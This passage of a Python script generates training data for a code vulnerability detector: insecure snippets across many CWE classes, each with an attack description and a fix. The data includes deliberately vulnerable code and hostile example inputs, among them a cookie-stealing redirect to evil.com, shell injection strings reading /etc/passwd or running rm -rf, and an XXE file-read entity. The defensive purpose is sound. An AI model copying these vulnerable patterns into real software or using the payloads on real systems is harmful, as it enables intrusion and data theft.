"""
학습 데이터 증강 — API 없이 로컬에서 실행
기존 lora_train.jsonl (50개) + NVD CWE 태그 기반 템플릿 → lora_train_v2.jsonl (~500개)

전략:
  1. 기존 50개 코드 변형 증강 (언어/변수명/컨텍스트 교체) → ~250개
  2. NVD 792개 CWE 태그 → CWE별 코드 템플릿 생성 → ~150개 추가
"""
import json
import random
from pathlib import Path

BASE  = Path(__file__).resolve().parent.parent
JSONL = BASE / "data" / "lora_train.jsonl"
NVD   = BASE / "data" / "nvdcve-2.0-preprocessed.json"
OUT   = BASE / "data" / "lora_train_v2.jsonl"

random.seed(42)


# ── 헬퍼 ──────────────────────────────────────────────────────────────────────

def make_entry(lang: str, code: str, cwe_id: str, cwe_name: str,
               severity: str, attack: str, fix: str) -> dict:
    prompt = (
        f"Analyze this {lang} code for security vulnerabilities:\n\n{code}\n\nVULN_TYPE:"
    )
    completion = (
        f"{cwe_id} {cwe_name}\n"
        f"SEVERITY: {severity}\n"
        f"ATTACK: {attack}\n"
        f"FIX:\n{fix}"
    )
    return {"prompt": prompt, "completion": completion}


# ══════════════════════════════════════════════════════════════════════════════
# 1. CWE별 변형 예제 풀
#    각 CWE에 대해 Python / Java / Node.js / PHP / C 등 여러 언어로 패턴 작성
# ══════════════════════════════════════════════════════════════════════════════

CWE_VARIANTS: list[dict] = []

# ── CWE-89: SQL Injection ─────────────────────────────────────────────────────
_sqli = [
    ("Python", 'cursor.execute("SELECT * FROM orders WHERE user_id=" + user_id)',
     "User controls user_id → dumps all orders or escalates to admin.",
     'cursor.execute("SELECT * FROM orders WHERE user_id=?", (user_id,))'),
    ("Python", 'db.execute(f"SELECT balance FROM accounts WHERE id={account_id}")',
     "Attacker sets account_id='1 OR 1=1' to read all balances.",
     'db.execute("SELECT balance FROM accounts WHERE id=?", (account_id,))'),
    ("Python", 'conn.execute("DELETE FROM tokens WHERE value=\'" + token + "\'")',
     "Attacker sends token ending with \\' OR 1=1-- to wipe all tokens.",
     'conn.execute("DELETE FROM tokens WHERE value=?", (token,))'),
    ("Java", 'stmt.executeQuery("SELECT * FROM users WHERE email=\'" + email + "\'")',
     "Email field injection leaks entire users table.",
     'PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE email=?");\nps.setString(1, email);'),
    ("Java", 'String sql = "UPDATE accounts SET role=\'" + role + "\' WHERE id=" + id;\nstmt.execute(sql);',
     "Attacker sets role=admin to escalate privileges.",
     'PreparedStatement ps = conn.prepareStatement("UPDATE accounts SET role=? WHERE id=?");\nps.setString(1, role); ps.setInt(2, id);'),
    ("Node.js / Express", 'db.query("SELECT * FROM sessions WHERE token=\'" + req.body.token + "\'");',
     "Token injection reveals all active sessions.",
     'db.query("SELECT * FROM sessions WHERE token=?", [req.body.token]);'),
    ("Node.js / Express", 'connection.query(`SELECT * FROM products WHERE name LIKE \'%${req.query.q}%\'`);',
     "Search query injection exposes full product database.",
     'connection.query("SELECT * FROM products WHERE name LIKE ?", [`%${req.query.q}%`]);'),
    ("PHP", '$result = mysqli_query($conn, "SELECT * FROM users WHERE username=\'" . $_POST[\'user\'] . "\'");',
     "Username field injection bypasses authentication.",
     '$stmt = $conn->prepare("SELECT * FROM users WHERE username=?");\n$stmt->bind_param("s", $_POST["user"]);'),
]
for lang, code, attack, fix in _sqli:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-89", "SQL Injection", "CRITICAL", attack, fix))

# ── CWE-79: XSS ───────────────────────────────────────────────────────────────
_xss = [
    ("React / Next.js", 'function Comment({ text }) {\n  return <p dangerouslySetInnerHTML={{__html: text}} />;\n}',
     "Attacker posts <script>document.cookie</script> to steal session cookies.",
     'function Comment({ text }) {\n  return <p>{text}</p>;\n}'),
    ("React / Next.js", "const url = searchParams.get('redirect');\nrouter.push(url);",
     "Attacker sets redirect=javascript:fetch('evil.com?c='+document.cookie).",
     "const url = searchParams.get('redirect');\nif (url?.startsWith('/')) router.push(url);"),
    ("Node.js / Express", "res.send('<h1>Hello ' + req.query.name + '</h1>');",
     "Attacker sets name=<script>alert(1)</script> to execute arbitrary JavaScript.",
     "const name = escapeHtml(req.query.name);\nres.send(`<h1>Hello ${name}</h1>`);"),
    ("Python", 'return f"<div>Welcome {request.args.get(\'name\')}</div>"',
     "Reflected XSS via name parameter.",
     "from markupsafe import escape\nreturn f'<div>Welcome {escape(request.args.get(\"name\"))}</div>'"),
    ("Java", 'response.getWriter().write("<p>Hello " + request.getParameter("name") + "</p>");',
     "Reflected XSS — attacker injects script tags in name parameter.",
     'String safe = HtmlUtils.htmlEscape(request.getParameter("name"));\nresponse.getWriter().write("<p>Hello " + safe + "</p>");'),
]
for lang, code, attack, fix in _xss:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-79", "Cross-Site Scripting (XSS)", "HIGH", attack, fix))

# ── CWE-77 / CWE-78: Command Injection ────────────────────────────────────────
_cmdi = [
    ("Python", "import os\nfilename = request.args.get('file')\nos.system(f'cat /var/log/{filename}')",
     "Attacker sets file=../../etc/passwd; rm -rf / to read arbitrary files or destroy data.",
     "import os, re\nfilename = request.args.get('file')\nif re.match(r'^[\\w.-]+$', filename):\n    os.system(f'cat /var/log/{filename}')"),
    ("Python", "import subprocess\nhost = request.form['host']\nresult = subprocess.run(f'nslookup {host}', shell=True, capture_output=True)",
     "Attacker sends host='8.8.8.8; cat /etc/passwd' to exfiltrate system files.",
     "import subprocess\nhost = request.form['host']\nresult = subprocess.run(['nslookup', host], shell=False, capture_output=True)"),
    ("Node.js / Express", "const { exec } = require('child_process');\nexec(`convert ${req.body.file} output.png`);",
     "File path injection — attacker sends 'x; id > /tmp/pwned' to run arbitrary commands.",
     "const { execFile } = require('child_process');\nexecFile('convert', [req.body.file, 'output.png']);"),
    ("Java", 'Runtime.getRuntime().exec("ping " + ipAddress);',
     "IP field injection — attacker sends '8.8.8.8 && cat /etc/shadow'.",
     'ProcessBuilder pb = new ProcessBuilder("ping", ipAddress);\npb.start();'),
    ("PHP", '$output = shell_exec("whois " . $_GET["domain"]);',
     "Domain parameter injection executes arbitrary OS commands.",
     '$domain = escapeshellarg($_GET["domain"]);\n$output = shell_exec("whois " . $domain);'),
    ("Python", "import subprocess\ncmd = request.json.get('command')\noutput = subprocess.check_output(cmd, shell=True)",
     "Direct command execution — any OS command can be run as the web server user.",
     "# Never pass user input to shell; use allowlist\nALLOWED = {'status': ['systemctl', 'status', 'nginx']}\noutput = subprocess.check_output(ALLOWED.get(cmd, ['echo', 'denied']), shell=False)"),
]
for lang, code, attack, fix in _cmdi:
    severity = "CRITICAL"
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-78", "OS Command Injection", severity, attack, fix))

# ── CWE-22: Path Traversal ────────────────────────────────────────────────────
_path = [
    ("Python", "filename = request.args.get('file')\nwith open('/var/uploads/' + filename) as f:\n    return f.read()",
     "Attacker sends file=../../../etc/passwd to read arbitrary system files.",
     "import os\nfilename = os.path.basename(request.args.get('file'))\npath = os.path.join('/var/uploads', filename)\nif not path.startswith('/var/uploads'):\n    abort(403)\nwith open(path) as f:\n    return f.read()"),
    ("Java", 'File file = new File("/uploads/" + fileName);\nFiles.readAllBytes(file.toPath());',
     "fileName=../../etc/shadow reads sensitive system files.",
     'Path base = Paths.get("/uploads").toRealPath();\nPath target = base.resolve(fileName).normalize();\nif (!target.startsWith(base)) throw new SecurityException("Path traversal");\nFiles.readAllBytes(target);'),
    ("Node.js / Express", "const filePath = path.join(__dirname, 'uploads', req.params.name);\nres.sendFile(filePath);",
     "name=../../package.json reveals application internals.",
     "const filePath = path.resolve(__dirname, 'uploads', req.params.name);\nif (!filePath.startsWith(path.resolve(__dirname, 'uploads'))) return res.status(403).send('Forbidden');\nres.sendFile(filePath);"),
    ("PHP", "$file = $_GET['page'];\ninclude('/var/www/pages/' . $file . '.php');",
     "page=../../../../etc/passwd%00 can include arbitrary files (null byte bypass).",
     "$page = basename(preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['page']));\ninclude('/var/www/pages/' . $page . '.php');"),
]
for lang, code, attack, fix in _path:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-22", "Path Traversal", "HIGH", attack, fix))

# ── CWE-798: Hardcoded Credentials ───────────────────────────────────────────
_hardcoded = [
    ("Python", 'import hashlib\nADMIN_PASSWORD = "admin123"\nif hashlib.md5(password.encode()).hexdigest() == hashlib.md5(ADMIN_PASSWORD.encode()).hexdigest():\n    login()',
     "Hardcoded MD5 password in source code — leaked via git history or decompilation.",
     'import bcrypt\nif bcrypt.checkpw(password.encode(), stored_hash):\n    login()'),
    ("Java", 'private static final String DB_PASSWORD = "P@ssw0rd2024";\nDriverManager.getConnection(url, "root", DB_PASSWORD);',
     "DB credentials in source code — anyone with repo access can access the database.",
     'String dbPassword = System.getenv("DB_PASSWORD");\nDriverManager.getConnection(url, "root", dbPassword);'),
    ("Node.js / Express", "const SECRET = 'mysupersecret';\napp.use(session({ secret: SECRET }));",
     "Hardcoded session secret — attacker can forge signed cookies.",
     "const SECRET = process.env.SESSION_SECRET;\nif (!SECRET) throw new Error('SESSION_SECRET not set');\napp.use(session({ secret: SECRET }));"),
    ("Python", "AWS_ACCESS_KEY = 'AKIAIOSFODNN7EXAMPLE'\nAWS_SECRET = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'",
     "AWS credentials in source code — exposed via GitHub scan or leak.",
     "import os\nAWS_ACCESS_KEY = os.environ['AWS_ACCESS_KEY_ID']\nAWS_SECRET = os.environ['AWS_SECRET_ACCESS_KEY']"),
    ("Python", "API_KEY = 'sk-proj-abcdef123456'\nheaders = {'Authorization': f'Bearer {API_KEY}'}",
     "API key committed to version control — scraped by automated scanners within minutes.",
     "import os\nAPI_KEY = os.getenv('API_KEY')\nif not API_KEY:\n    raise EnvironmentError('API_KEY not set')\nheaders = {'Authorization': f'Bearer {API_KEY}'}"),
]
for lang, code, attack, fix in _hardcoded:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-798", "Hardcoded Credentials", "CRITICAL", attack, fix))

# ── CWE-502: Insecure Deserialization ─────────────────────────────────────────
_deser = [
    ("Python", "import pickle, base64\ndata = base64.b64decode(request.cookies.get('session'))\nobj = pickle.loads(data)",
     "Attacker crafts a pickle payload that executes os.system('rm -rf /') on deserialization.",
     "import json\ndata = json.loads(request.cookies.get('session', '{}'))"),
    ("Java", "ObjectInputStream ois = new ObjectInputStream(request.getInputStream());\nObject obj = ois.readObject();",
     "Gadget chain exploit (e.g., Apache Commons Collections) achieves RCE on deserialization.",
     "// Use JSON instead of Java serialization\nObjectMapper mapper = new ObjectMapper();\nMyDto dto = mapper.readValue(request.getInputStream(), MyDto.class);"),
    ("Python", "import marshal\ncode = marshal.loads(request.data)\nexec(code)",
     "Marshal deserializes arbitrary bytecode — attacker sends payload that spawns a reverse shell.",
     "# Never deserialize untrusted bytecode. Use JSON for data exchange.\nimport json\ndata = json.loads(request.data)"),
    ("Node.js / Express", "const obj = eval('(' + req.body.data + ')');",
     "Attacker sends data='(function(){require(\"child_process\").exec(\"id\")})()'.",
     "const obj = JSON.parse(req.body.data);"),
]
for lang, code, attack, fix in _deser:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-502", "Insecure Deserialization", "CRITICAL", attack, fix))

# ── CWE-284 / CWE-863: Broken Access Control ──────────────────────────────────
_authz = [
    ("Python", "@app.route('/api/admin/export')\ndef export_data():\n    return db.export_all_users()",
     "No authentication — any user can call the endpoint and dump the full user database.",
     "@app.route('/api/admin/export')\n@login_required\ndef export_data():\n    if not current_user.is_admin:\n        abort(403)\n    return db.export_all_users()"),
    ("Java", '@GetMapping("/api/salary/{employeeId}")\npublic ResponseEntity<Salary> getSalary(@PathVariable Long employeeId) {\n    return ResponseEntity.ok(salaryService.find(employeeId));\n}',
     "IDOR — attacker iterates employeeId to read any employee's salary.",
     '@GetMapping("/api/salary/{employeeId}")\n@PreAuthorize("#employeeId == authentication.principal.id or hasRole(\'HR\')")\npublic ResponseEntity<Salary> getSalary(@PathVariable Long employeeId) {\n    return ResponseEntity.ok(salaryService.find(employeeId));\n}'),
    ("Node.js / Express", "app.delete('/api/post/:id', async (req, res) => {\n  await Post.findByIdAndDelete(req.params.id);\n  res.json({ deleted: true });\n});",
     "No ownership check — attacker deletes any user's post by guessing the ID.",
     "app.delete('/api/post/:id', requireAuth, async (req, res) => {\n  const post = await Post.findOne({ _id: req.params.id, author: req.user.id });\n  if (!post) return res.status(403).json({ error: 'Forbidden' });\n  await post.deleteOne();\n  res.json({ deleted: true });\n});"),
    ("Python", "@app.route('/download/<filename>')\n@login_required\ndef download(filename):\n    user_files = get_user_files(current_user.id)\n    return send_file(f'/data/{filename}')",
     "Files are fetched by name without ownership check — user can download any file.",
     "@app.route('/download/<filename>')\n@login_required\ndef download(filename):\n    if filename not in get_user_files(current_user.id):\n        abort(403)\n    return send_file(f'/data/{current_user.id}/{filename}')"),
]
for lang, code, attack, fix in _authz:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-284", "Improper Access Control", "HIGH", attack, fix))

# ── CWE-306: Missing Authentication ───────────────────────────────────────────
_auth = [
    ("Node.js / Express", "app.post('/api/reset-password', async (req, res) => {\n  await User.update({ email: req.body.email }, { password: req.body.newPassword });\n  res.json({ ok: true });\n});",
     "No token or verification — attacker resets any user's password knowing only their email.",
     "app.post('/api/reset-password', async (req, res) => {\n  const token = req.body.token;\n  const valid = await PasswordToken.findOne({ token, expiresAt: { $gt: Date.now() } });\n  if (!valid) return res.status(401).json({ error: 'Invalid token' });\n  await User.update({ email: valid.email }, { password: req.body.newPassword });\n  res.json({ ok: true });\n});"),
    ("Python", "@app.route('/api/change-email', methods=['POST'])\n@login_required\ndef change_email():\n    current_user.email = request.json['email']\n    db.session.commit()",
     "No password re-confirmation — attacker with a stolen session can hijack the account.",
     "@app.route('/api/change-email', methods=['POST'])\n@login_required\ndef change_email():\n    if not current_user.check_password(request.json['password']):\n        abort(403)\n    current_user.email = request.json['email']\n    db.session.commit()"),
    ("Java", '@PostMapping("/admin/deleteUser")\npublic ResponseEntity<?> deleteUser(@RequestParam Long userId) {\n    userService.delete(userId);\n    return ResponseEntity.ok().build();\n}',
     "Admin endpoint accessible without authentication — any request can delete users.",
     '@PostMapping("/admin/deleteUser")\n@PreAuthorize("hasRole(\'ADMIN\')")\npublic ResponseEntity<?> deleteUser(@RequestParam Long userId) {\n    userService.delete(userId);\n    return ResponseEntity.ok().build();\n}'),
]
for lang, code, attack, fix in _auth:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-306", "Missing Authentication", "CRITICAL", attack, fix))

# ── CWE-311 / CWE-319: Sensitive Data Exposure ────────────────────────────────
_exposure = [
    ("Python", "logging.info(f'User login: email={email}, password={password}')",
     "Passwords written to log files — accessible to anyone with log read access.",
     "logging.info(f'User login: email={email}')"),
    ("Node.js / Express", "console.log('Auth token:', req.headers.authorization);",
     "Bearer token logged — appears in log aggregators, accessible to ops team.",
     "console.log('Auth request received');"),
    ("Java", 'logger.debug("Payment processing: card={}, cvv={}", card.getNumber(), card.getCvv());',
     "PAN and CVV written to debug logs — PCI DSS violation and credential exposure.",
     'logger.debug("Payment processing: card=****{}", card.getLast4());'),
    ("Python", "@app.route('/api/user/<id>')\ndef get_user(id):\n    user = User.query.get(id)\n    return jsonify(user.__dict__)",
     "__dict__ serializes ALL fields including password_hash and 2FA secret.",
     "@app.route('/api/user/<id>')\n@login_required\ndef get_user(id):\n    user = User.query.get(id)\n    return jsonify({'id': user.id, 'email': user.email, 'name': user.name})"),
]
for lang, code, attack, fix in _exposure:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-200", "Sensitive Data Exposure", "HIGH", attack, fix))

# ── CWE-918: SSRF ─────────────────────────────────────────────────────────────
_ssrf = [
    ("Python", "import requests\nurl = request.args.get('url')\nresp = requests.get(url)\nreturn resp.content",
     "Attacker sends url=http://169.254.169.254/latest/meta-data/ to steal AWS instance credentials.",
     "import requests, ipaddress\nurl = request.args.get('url')\nparsed = urlparse(url)\nif parsed.hostname in ('169.254.169.254', 'localhost', '127.0.0.1'):\n    abort(400)\nresp = requests.get(url)\nreturn resp.content"),
    ("Node.js / Express", "const url = req.query.webhook;\nfetch(url).then(r => r.text()).then(data => res.json({ data }));",
     "Webhook URL used to probe internal services or metadata endpoints.",
     "const url = new URL(req.query.webhook);\nif (!['http:', 'https:'].includes(url.protocol) || url.hostname === 'localhost') {\n  return res.status(400).json({ error: 'Invalid URL' });\n}\nfetch(url).then(r => r.text()).then(data => res.json({ data }));"),
    ("Java", 'URL url = new URL(request.getParameter("imageUrl"));\nBufferedImage img = ImageIO.read(url);',
     "Attacker reads internal services via imageUrl=http://internal-db:5432.",
     'String rawUrl = request.getParameter("imageUrl");\nif (!rawUrl.startsWith("https://trusted.cdn.com/")) throw new SecurityException("Invalid image URL");\nURL url = new URL(rawUrl);\nBufferedImage img = ImageIO.read(url);'),
]
for lang, code, attack, fix in _ssrf:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-918", "Server-Side Request Forgery (SSRF)", "HIGH", attack, fix))

# ── CWE-611: XXE ──────────────────────────────────────────────────────────────
_xxe = [
    ("Java", 'DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder db = dbf.newDocumentBuilder();\nDocument doc = db.parse(new InputSource(new StringReader(xmlInput)));',
     "XXE — attacker sends <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> to read system files.",
     'DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature("http://xml.org/sax/features/external-general-entities", false);\ndbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);\ndbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);'),
    ("Python", "import xml.etree.ElementTree as ET\ntree = ET.parse(uploaded_file)",
     "XXE via uploaded XML file reads /etc/passwd or internal network files.",
     "import defusedxml.ElementTree as ET\ntree = ET.parse(uploaded_file)"),
]
for lang, code, attack, fix in _xxe:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-611", "XML External Entity (XXE)", "HIGH", attack, fix))

# ── CWE-352: CSRF ─────────────────────────────────────────────────────────────
_csrf = [
    ("Node.js / Express", "app.post('/api/transfer', (req, res) => {\n  transferFunds(req.session.userId, req.body.to, req.body.amount);\n  res.json({ ok: true });\n});",
     "No CSRF token — attacker's malicious page silently transfers funds from victim's session.",
     "const csrf = require('csurf');\napp.post('/api/transfer', csrf(), (req, res) => {\n  transferFunds(req.session.userId, req.body.to, req.body.amount);\n  res.json({ ok: true });\n});"),
    ("Python", "@app.route('/settings/email', methods=['POST'])\n@login_required\ndef change_email():\n    current_user.email = request.form['email']\n    db.session.commit()",
     "No CSRF protection — attacker hosts <form action='...' method='POST'> on their site.",
     "@app.route('/settings/email', methods=['POST'])\n@login_required\ndef change_email():\n    if not validate_csrf(request.form.get('csrf_token')):\n        abort(403)\n    current_user.email = request.form['email']\n    db.session.commit()"),
]
for lang, code, attack, fix in _csrf:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-352", "Cross-Site Request Forgery (CSRF)", "HIGH", attack, fix))

# ── CWE-120 / CWE-121: Buffer Overflow (C/C++) ────────────────────────────────
_bof = [
    ("C", "void processInput(char *input) {\n    char buf[128];\n    strcpy(buf, input);\n}",
     "Input longer than 128 bytes overwrites return address → arbitrary code execution.",
     "void processInput(char *input) {\n    char buf[128];\n    strncpy(buf, input, sizeof(buf) - 1);\n    buf[sizeof(buf) - 1] = '\\0';\n}"),
    ("C", "void readPacket(int sock) {\n    char buf[512];\n    int n = recv(sock, buf, 65535, 0);\n    buf[n] = '\\0';\n}",
     "recv() reads up to 65535 bytes into 512-byte buffer → stack overflow.",
     "void readPacket(int sock) {\n    char buf[512];\n    int n = recv(sock, buf, sizeof(buf) - 1, 0);\n    if (n < 0) return;\n    buf[n] = '\\0';\n}"),
    ("C", "void login(char *username) {\n    char name[32];\n    sprintf(name, \"Welcome %s\", username);\n    puts(name);\n}",
     "Long username overflows name[] buffer.",
     "void login(char *username) {\n    char name[32];\n    snprintf(name, sizeof(name), \"Welcome %s\", username);\n    puts(name);\n}"),
]
for lang, code, attack, fix in _bof:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-120", "Buffer Overflow", "CRITICAL", attack, fix))

# ── CWE-416: Use-After-Free (C/C++) ───────────────────────────────────────────
_uaf = [
    ("C", "char *buf = malloc(64);\nfree(buf);\nstrcpy(buf, userInput);",
     "Freed memory reused → heap corruption, potential code execution via tcache poisoning.",
     "char *buf = malloc(64);\n// ... use buf ...\nfree(buf);\nbuf = NULL;  // prevent use-after-free"),
    ("C++", "Node *node = new Node(value);\ndelete node;\nstd::cout << node->value;",
     "Accessing deleted object — undefined behavior, exploitable via heap spray.",
     "std::unique_ptr<Node> node = std::make_unique<Node>(value);\n// node is automatically freed, no dangling pointer"),
]
for lang, code, attack, fix in _uaf:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-416", "Use After Free", "HIGH", attack, fix))

# ── CWE-476: NULL Pointer Dereference ─────────────────────────────────────────
_null = [
    ("C", "char *result = strstr(input, \"key=\");\nint len = strlen(result + 4);",
     "If 'key=' not found, result is NULL → crash or kernel panic in privileged context.",
     "char *result = strstr(input, \"key=\");\nif (result == NULL) return -1;\nint len = strlen(result + 4);"),
    ("Java", 'String value = map.get("key");\nif (value.equals("admin")) { grantAccess(); }',
     "get() returns null when key missing → NullPointerException bypasses security check in some flows.",
     'String value = map.get("key");\nif ("admin".equals(value)) { grantAccess(); }'),
]
for lang, code, attack, fix in _null:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-476", "NULL Pointer Dereference", "MEDIUM", attack, fix))

# ── CWE-190: Integer Overflow ─────────────────────────────────────────────────
_int = [
    ("C", "int total = price * quantity;\nchar *buf = malloc(total);\nmemcpy(buf, data, total);",
     "price * quantity overflows int → tiny malloc(), memcpy writes past the buffer.",
     "if (quantity > 0 && price > INT_MAX / quantity) { error(); return; }\nsize_t total = (size_t)price * quantity;\nchar *buf = malloc(total);\nmemcpy(buf, data, total);"),
    ("Python", "size = int(request.args.get('size'))\nbuf = bytearray(size)",
     "Attacker sends size=99999999999 → MemoryError / DoS.",
     "size = int(request.args.get('size', 0))\nif size < 0 or size > 10 * 1024 * 1024:\n    abort(400)\nbuf = bytearray(size)"),
]
for lang, code, attack, fix in _int:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-190", "Integer Overflow", "HIGH", attack, fix))

# ── CWE-400: Resource Exhaustion / DoS ────────────────────────────────────────
_dos = [
    ("Python", "data = json.loads(request.data)\nresult = process(data)",
     "Attacker sends deeply nested JSON with 10,000 levels → Python recursion limit crash.",
     "import json\ndata = json.loads(request.data, parse_constant=None)\nif len(str(data)) > 1_000_000:\n    abort(413)\nresult = process(data)"),
    ("Node.js / Express", "app.get('/search', async (req, res) => {\n  const results = await db.find({ q: req.query.q });\n  res.json(results);\n});",
     "Empty query returns all records; repeated calls exhaust DB connections.",
     "app.get('/search', async (req, res) => {\n  if (!req.query.q || req.query.q.length < 3) return res.status(400).json({ error: 'Query too short' });\n  const results = await db.find({ q: req.query.q }).limit(100);\n  res.json(results);\n});"),
    ("Python", "import re\npattern = request.args.get('pattern')\nre.match(pattern, user_input)",
     "ReDoS — attacker sends (a+)+ pattern against long input to freeze the server.",
     "# Never use user-supplied regex; use allowlist of safe patterns\nALLOWED_PATTERNS = {'email': r'^[\\w.@-]+$', 'uuid': r'^[0-9a-f-]{36}$'}\nname = request.args.get('pattern')\npattern = ALLOWED_PATTERNS.get(name)\nif not pattern:\n    abort(400)"),
]
for lang, code, attack, fix in _dos:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-400", "Resource Exhaustion / DoS", "HIGH", attack, fix))

# ── GitHub Actions / CI Specific ──────────────────────────────────────────────
_ci = [
    ("GitHub Actions YAML", "- name: Install deps\n  run: npm install ${{ github.event.issue.body }}",
     "Issue body injected into npm install command → supply chain RCE on CI runner.",
     "- name: Install deps\n  run: npm install\n  # Never interpolate untrusted event data into run steps"),
    ("GitHub Actions YAML", "- uses: actions/setup-node@master",
     "Unpinned 'master' branch — compromised maintainer can inject malicious code.",
     "- uses: actions/setup-node@v4  # pin to specific version tag"),
    ("GitHub Actions YAML", "- name: Deploy\n  env:\n    AWS_SECRET: ${{ secrets.AWS_SECRET }}\n  run: echo \"Deploying with $AWS_SECRET\"",
     "Secret printed to public CI log — visible to anyone with repo access.",
     "- name: Deploy\n  env:\n    AWS_SECRET: ${{ secrets.AWS_SECRET }}\n  run: ./deploy.sh  # never echo secrets"),
]
for lang, code, attack, fix in _ci:
    CWE_VARIANTS.append(make_entry(lang, code, "CWE-77", "Command/Script Injection (CI)", "HIGH", attack, fix))


# ══════════════════════════════════════════════════════════════════════════════
# 2. NVD CVE description → 추가 컨텍스트 예제 생성
#    description에서 핵심 단어를 추출해 새로운 코드 예제의 컨텍스트로 활용
# ══════════════════════════════════════════════════════════════════════════════

# NVD CWE → 학습 데이터 CWE 매핑
CWE_MAP = {
    "CWE-89":  ("CWE-89",  "SQL Injection",          "CRITICAL"),
    "CWE-79":  ("CWE-79",  "Cross-Site Scripting",   "HIGH"),
    "CWE-78":  ("CWE-78",  "OS Command Injection",   "CRITICAL"),
    "CWE-77":  ("CWE-77",  "Command Injection",      "CRITICAL"),
    "CWE-22":  ("CWE-22",  "Path Traversal",         "HIGH"),
    "CWE-284": ("CWE-284", "Improper Access Control","HIGH"),
    "CWE-306": ("CWE-306", "Missing Authentication", "CRITICAL"),
    "CWE-502": ("CWE-502", "Insecure Deserialization","CRITICAL"),
    "CWE-798": ("CWE-798", "Hardcoded Credentials",  "CRITICAL"),
    "CWE-200": ("CWE-200", "Sensitive Data Exposure", "HIGH"),
    "CWE-918": ("CWE-918", "SSRF",                   "HIGH"),
    "CWE-352": ("CWE-352", "CSRF",                   "HIGH"),
    "CWE-611": ("CWE-611", "XXE Injection",          "HIGH"),
    "CWE-400": ("CWE-400", "Resource Exhaustion",    "MEDIUM"),
    "CWE-190": ("CWE-190", "Integer Overflow",       "HIGH"),
    "CWE-120": ("CWE-120", "Buffer Overflow",        "CRITICAL"),
    "CWE-416": ("CWE-416", "Use After Free",         "HIGH"),
    "CWE-476": ("CWE-476", "NULL Pointer Dereference","MEDIUM"),
}

# CWE별 짧은 코드 스니펫 (NVD description 컨텍스트와 조합)
NVD_TEMPLATES: dict[str, list[tuple]] = {
    "CWE-89": [
        ("Node.js / Express",
         'db.query(`SELECT * FROM {table} WHERE {field}=\'${{{param}}}\'`);',
         "User-controlled {param} allows SQL injection to dump the {table} table.",
         'db.query("SELECT * FROM {table} WHERE {field}=?", [{param}]);'),
        ("Python",
         'cursor.execute("SELECT * FROM {table} WHERE {field}=" + {param})',
         "Direct string concatenation in {table} query allows SQL injection.",
         'cursor.execute("SELECT * FROM {table} WHERE {field}=?", ({param},))'),
    ],
    "CWE-79": [
        ("Node.js / Express",
         "res.send('<div>' + {param} + '</div>');",
         "Reflected XSS — attacker controls {param} to inject script tags.",
         "const safe = escapeHtml({param});\nres.send('<div>' + safe + '</div>');"),
        ("Python",
         "return '<p>' + {param} + '</p>'",
         "Reflected XSS via {param} — script tags injected into response.",
         "from markupsafe import escape\nreturn '<p>' + str(escape({param})) + '</p>'"),
    ],
    "CWE-78": [
        ("Python",
         "subprocess.run(f'analyze {{{param}}}', shell=True)",
         "Attacker injects '; cat /etc/passwd' via {param}.",
         "subprocess.run(['analyze', {param}], shell=False)"),
    ],
    "CWE-22": [
        ("Python",
         "open(os.path.join(BASE_DIR, {param})).read()",
         "Path traversal via {param} → reads files outside BASE_DIR.",
         "safe = os.path.realpath(os.path.join(BASE_DIR, {param}))\nif not safe.startswith(BASE_DIR): abort(403)\nopen(safe).read()"),
    ],
    "CWE-284": [
        ("Python",
         "@app.route('/api/{resource}/<id>')\ndef get_resource(id):\n    return jsonify(Resource.query.get(id))",
         "No ownership check — IDOR allows any user to access any {resource}.",
         "@app.route('/api/{resource}/<id>')\n@login_required\ndef get_resource(id):\n    obj = Resource.query.filter_by(id=id, owner=current_user.id).first_or_404()\n    return jsonify(obj)"),
    ],
}


_TABLE_NAMES  = ["users", "products", "orders", "sessions", "logs", "payments",
                  "files", "messages", "reports", "accounts", "tokens", "records"]
_FIELD_NAMES  = ["id", "user_id", "account_id", "record_id", "item_id", "entry_id"]
_PARAM_NAMES  = ["input", "query", "value", "data", "payload", "request_data",
                  "user_input", "form_data", "raw_input", "param"]
_RESOURCE_NAMES = ["document", "profile", "report", "invoice", "attachment",
                    "contract", "record", "asset", "item", "entry"]


def expand_nvd_templates(nvd_data: list[dict], limit: int = 300) -> list[dict]:
    """NVD CVE를 템플릿에 적용해 추가 학습 예제 생성. CVE마다 다른 변수 조합 사용."""
    results = []
    cve_tmpl_seen: set[tuple] = set()

    for cve in nvd_data:
        if len(results) >= limit:
            break
        cwe = cve.get("cwe_primary", "UNKNOWN")
        if cwe not in NVD_TEMPLATES:
            continue

        desc = cve.get("description", "")
        # CVE description에서 컨텍스트 단어 추출
        words = [w.strip(".,();:") for w in desc.split()
                 if 5 <= len(w) <= 20 and w[0].islower() and w.isalpha()]

        rng = random.Random(hash(cve["id"]))
        param    = rng.choice(words[:8]) if len(words) >= 3 else rng.choice(_PARAM_NAMES)
        table    = rng.choice(_TABLE_NAMES)
        field    = rng.choice(_FIELD_NAMES)
        cls      = rng.choice(["container", "wrapper", "content", "section", "panel"])
        resource = rng.choice(_RESOURCE_NAMES)

        for tmpl_lang, tmpl_code, tmpl_attack, tmpl_fix in NVD_TEMPLATES[cwe]:
            key = (cve["id"], tmpl_lang)
            if key in cve_tmpl_seen:
